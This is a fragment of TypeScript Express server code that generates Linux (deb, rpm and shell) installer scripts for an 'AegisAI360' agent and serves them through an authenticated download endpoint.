      ].join("\n");
      const debFooter = [
        "",
        'DEB_PATH="/tmp/aegisai360-agent_${VERSION}_${ARCH}.deb"',
        'dpkg-deb --build "$PKGDIR" "$DEB_PATH"',
        'echo "[>>] Installing package: $DEB_PATH"',
        'dpkg -i "$DEB_PATH"',
        'echo "[OK] Package installed: $DEB_PATH"',
        'echo "     To uninstall: sudo dpkg -r aegisai360-agent"',
      ].join("\n");
      return debHeader + debInstallBody + debFooter;
    }

    // rpm
    const rpmHeader = [
      "#!/usr/bin/env bash",
      `# AegisAI360 Agent v${AGENT_VERSION} — CentOS/RHEL Installer`,
      "# Installs via direct deployment (rpmbuild not required)",
      "set -euo pipefail",
      "",
    ].join("\n");
    return rpmHeader + commonBody + '\necho "RPM-compatible install complete."';
  }

  app.get("/api/deploy/package/:type", requireAuth, (req: any, res) => {
    const pkgType = req.params.type as string;
    if (!["deb", "rpm", "sh"].includes(pkgType)) {
      return res.status(404).json({ error: "Unknown package type. Use deb, rpm, or sh." });
    }
    const proto = req.headers["x-forwarded-proto"] || req.protocol;
    const host  = req.headers["x-forwarded-host"] || req.get("host");
    const serverUrl = `${proto}://${host}`;
    const token = (req.query.token as string) || "YOUR_DEVICE_TOKEN";

    const script = makeLinuxPackageScript(pkgType as "deb" | "rpm" | "sh", serverUrl, token);
    const filename = pkgType === "sh"
      ? `aegisai360-agent_${AGENT_VERSION}_linux.sh`
      : pkgType === "deb"
      ? `aegisai360-agent_${AGENT_VERSION}_amd64.deb.sh`
      : `aegisai360-agent_${AGENT_VERSION}_x86_64.rpm.sh`;

    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.send(script);
  });

  return httpServer;
}
